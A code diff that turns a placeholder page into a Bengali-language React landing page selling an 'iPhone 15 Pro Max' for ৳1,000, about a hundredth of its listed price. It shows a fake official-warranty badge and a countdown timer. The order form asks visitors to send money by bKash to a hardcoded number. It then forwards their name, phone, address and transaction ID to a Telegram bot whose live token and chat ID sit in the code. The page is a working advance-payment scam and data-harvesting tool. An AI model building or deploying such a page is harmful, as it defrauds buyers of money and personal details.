@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>iPhone 15 Pro Max Offer</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPhone 15 Pro Max - Limited Offer</title>
     <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
     <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
@@ -12,13 +12,121 @@
         @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&display=swap');
         body { font-family: 'Hind Siliguri', sans-serif; }
     </style>
-  </head>
-  <body>
+</head>
+<body>
     <div id="root"></div>
 
     <script type="text/babel">
-        // নিচের লাইনটি আপনার App.jsx থেকে কপি করে এখানে বসান
-        // অথবা সরাসরি App.jsx ফাইলটি এডিট করে টাইপ চেঞ্জ করে দিন
+        const { useState, useEffect } = React;
+
+        const PremiumLandingPage = () => {
+            const [timeLeft, setTimeLeft] = useState(1800);
+            const [currentImg, setCurrentImg] = useState(0);
+            const [selectedColor, setSelectedColor] = useState('Natural Titanium');
+            const [showPopup, setShowPopup] = useState(false);
+            const [formData, setFormData] = useState({ name: '', phone: '', address: '', trxId: '' });
+
+            const BOT_TOKEN = "8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ"; 
+            const CHAT_ID = "5085997009"; 
+            const MY_BKASH_NUMBER = "01870428306"; 
+
+            const images = [
+                "https://i.ibb.co.com/gbyH4tY2/50a71c0303bca79fc4d2fae2ca50cfd1.png",
+                "https://i.ibb.co.com/jvvx7964/7027ce0fdbb92010a312f4814bb04afc.png",
+                "https://i.ibb.co.com/bgBP1D78/3f82de66235c46865d5276b1b69ba22f.png",
+                "https://i.ibb.co.com/ccCJWnFt/pngwing-com.png",
+                "https://i.ibb.co.com/hFDwZyLZ/90f5aa1b9a9a95892ef87d1833319da8.png"
+            ];
+
+            useEffect(() => {
+                const slideTimer = setInterval(() => {
+                    setCurrentImg((prev) => (prev === images.length - 1 ? 0 : prev + 1));
+                }, 3000);
+                return () => clearInterval(slideTimer);
+            }, [images.length]);
+
+            useEffect(() => {
+                if (timeLeft <= 0) return;
+                const timer = setInterval(() => setTimeLeft(prev => prev - 1), 1000);
+                return () => clearInterval(timer);
+            }, [timeLeft]);
+
+            const formatTime = (s) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, '0')}`;
+
+            const handleOrder = async (e) => {
+                e.preventDefault();
+                const message = `🚀 **নতুন প্রিমিয়াম অর্ডার!**\n━━━━━━━━━━━━━\n👤 নাম: ${formData.name}\n📞 নাম্বার: ${formData.phone}\n🎨 কালার: ${selectedColor}\n🏠 ঠিকানা: ${formData.address}\n💰 TrxID: ${formData.trxId}\n━━━━━━━━━━━━━`;
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
+                    });
+                    setShowPopup(true);
+                } catch (err) { alert("সমস্যা হয়েছে, আবার চেষ্টা করুন।"); }
+            };
+
+            return (
+                <div className="bg-gray-50 min-h-screen text-gray-900 pb-32 overflow-x-hidden">
+                    <div className="bg-red-600 text-white text-center py-2 sticky top-0 z-50 font-bold text-sm">
+                        ফ্ল্যাশ সেল শেষ হতে বাকি: {formatTime(timeLeft)} মিনিট
+                    </div>
+
+                    <div className="relative w-full bg-white overflow-hidden shadow-inner">
+                        <div className="flex transition-transform duration-700 ease-in-out" style={{ transform: `translateX(-${currentImg * 100}%)`, width: `${images.length * 100}%` }}>
+                            {images.map((img, i) => (
+                                <div key={i} className="w-full flex-shrink-0 flex justify-center items-center bg-white">
+                                    <img src={img} className="w-full h-auto max-h-[450px] object-contain" alt="iPhone" />
+                                </div>
+                            ))}
+                        </div>
+                    </div>
+
+                    <div className="p-5 bg-white rounded-b-[40px] shadow-lg">
+                        <div className="flex justify-between items-start">
+                            <h1 className="text-2xl font-black text-gray-800 leading-tight">iPhone 15 Pro Max <br/><span className="text-gray-400 text-sm font-normal">256GB, Titanium Edition</span></h1>
+                            <span className="bg-red-100 text-red-600 text-[10px] font-bold px-2 py-1 rounded-full">অফিসিয়াল ওয়ারেন্টি</span>
+                        </div>
+                        <div className="mt-4 flex items-baseline gap-3">
+                            <span className="text-4xl font-black text-blue-600">৳ ১,০০০</span>
+                            <span className="text-lg text-gray-400 line-through">৳ ১,৫৯,০০০</span>
+                        </div>
+                    </div>
+
+                    <div id="order" className="m-6 bg-gray-50 p-6 rounded-3xl border-2 border-blue-200">
+                        <h3 className="text-xl font-black text-center mb-6">অর্ডার ফর্ম</h3>
+                        <form onSubmit={handleOrder} className="space-y-4">
+                            <input type="text" placeholder="আপনার নাম" className="w-full p-4 rounded-xl border" onChange={(e) => setFormData({...formData, name: e.target.value})} required />
+                            <input type="tel" placeholder="মোবাইল নাম্বার" className="w-full p-4 rounded-xl border" onChange={(e) => setFormData({...formData, phone: e.target.value})} required />
+                            <textarea placeholder="ঠিকানা" className="w-full p-4 rounded-xl border" onChange={(e) => setFormData({...formData, address: e.target.value})} required></textarea>
+                            <div className="bg-blue-600 text-white p-5 rounded-2xl">
+                                <p className="text-xs font-bold mb-1">বিকাশ ১,০০০৳ করুন:</p>
+                                <p className="text-2xl font-black">{MY_BKASH_NUMBER}</p>
+                                <input type="text" placeholder="TrxID দিন" className="w-full p-3 mt-4 bg-white text-gray-900 rounded-lg font-bold" onChange={(e) => setFormData({...formData, trxId: e.target.value})} required />
+                            </div>
+                            <button className="w-full bg-blue-700 text-white py-5 rounded-2xl font-black text-xl shadow-xl">অর্ডার কনফার্ম করুন</button>
+                        </form>
+                    </div>
+
+                    <div className="fixed bottom-0 left-0 right-0 p-4 bg-white/80 backdrop-blur-lg border-t z-50">
+                        <button onClick={() => document.getElementById('order').scrollIntoView({behavior: 'smooth'})} className="w-full bg-green-500 text-white py-4 rounded-2xl text-xl font-black">BUY NOW</button>
+                    </div>
+
+                    {showPopup && (
+                        <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-[100] p-6 text-center">
+                            <div className="bg-white p-10 rounded-[40px]">
+                                <h2 className="text-3xl font-black text-green-600 mb-2">অর্ডার সফল!</h2>
+                                <p>২-৩ দিনের মধ্যে ডেলিভারি পাবেন।</p>
+                                <button onClick={() => setShowPopup(false)} className="mt-8 w-full bg-gray-900 text-white py-4 rounded-2xl font-bold">CLOSE</button>
+                            </div>
+                        </div>
+                    )}
+                </div>
+            );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<PremiumLandingPage />);
     </script>
-  </body>
+</body>
 </html>
